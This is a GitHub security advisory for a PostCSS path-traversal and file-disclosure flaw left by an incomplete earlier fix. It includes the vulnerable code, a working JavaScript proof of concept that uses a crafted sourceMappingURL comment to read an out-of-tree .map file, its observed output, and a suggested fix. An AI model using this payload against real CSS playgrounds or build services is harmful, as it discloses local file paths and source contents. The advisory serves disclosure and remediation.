# [M] PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset

## Summary
Severity: Medium
Advisory: GHSA-fxqj-rqcc-2cmp
CVE: CVE-2026-69153
CWE: CWE-200, CWE-22
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-03
Source: https://github.com/advisories/GHSA-fxqj-rqcc-2cmp
Type: github-advisory

## Affected
- npm: `postcss` — affected >=0 <8.5.23

## Details
## Summary

The fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.

`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.

## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)

```js
// lib/previous-map.js
loadFile(path, cssFile, trusted) {
  if (!trusted && !this.unsafeMap) {
    if (!/\.map$/i.test(path)) {
      return undefined
    }
    if (cssFile) {                       // guard runs ONLY when `from` is set
      let relativePath = relative(dirname(cssFile), path)
      if (relativePath === '..' ||
          relativePath.startsWith('..' + sep) ||
          isAbsolute(relativePath)) {
        return undefined
      }
    }
  }
  this.root = dirname(path)
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()   // sink
  }
}

// loadMap(): untrusted annotation path, trusted=false; file === opts.from
} else if (this.annotation) {
  let map = this.annotation
  if (file) map = join(dirname(file), map)   // no `from` -> map stays the raw URL
  let unknown = this.loadFile(map, file, false)  // file undefined -> cssFile falsy
```

## Proof of concept (verified on postcss 8.5.22)

```js
const postcss = require('postcss')
const fs = require('fs')

// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)
const secret = '/tmp/pcpoc/secret_out_of_tree.map'
fs.writeFileSync(secret, JSON.stringify({
  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],
  sourcesContent: ['TOP_SECRET_abcdef']
}))

const css = 'a{color:red}\n/*# sourceMappingURL=' + secret + ' */'
const leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')

;(async () => {
  // A) NO `from`  -> guard skipped -> arbitrary absolute .map read + disclosed
  const a = await postcss([]).process(css, { map: true })
  console.log('no from   -> leaked:', !!leaks(a.map))   // true

  // B) WITH `from` -> guard active -> blocked
  const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })
  console.log('with from -> leaked:', !!leaks(b.map))    // false
})()
```

Observed output on postcss 8.5.22:

```
no from   -> leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map
with from -> leaked: false     # guard rejects the absolute path
```

`../` traversal (no `from`) also succeeds; non-`.map` targets (`.txt`, `?x=.map`, `#.map`) are blocked by the `.map` check. The tested build contains the GHSA-6g55 fix (`this.json = JSON.parse(...)` in `loadMap`, `consumer()` uses `this.json || this.text`), so this is a residual of that fix.

## Impact

Arbitrary `.map`-file read (absolute path or `../` traversal) and disclosure of the target map's `sources` (local filesystem paths) and `sourcesContent` (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a `from` option and exposes `result.map` (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in `.map` that parse as JSON.

## Suggested fix

Apply the traversal/absolute-path rejection to the untrusted map path regardless of whether `cssFile` is present (resolve against `process.cwd()` when there is no `cssFile`, and reject absolute paths and `..` escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.

## References
- https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp
- https://github.com/postcss/postcss/commit/7beca139e70f9075c6b19700fcb00dd8033e5da8
- https://github.com/postcss/postcss
- https://github.com/postcss/postcss/releases/tag/8.5.19
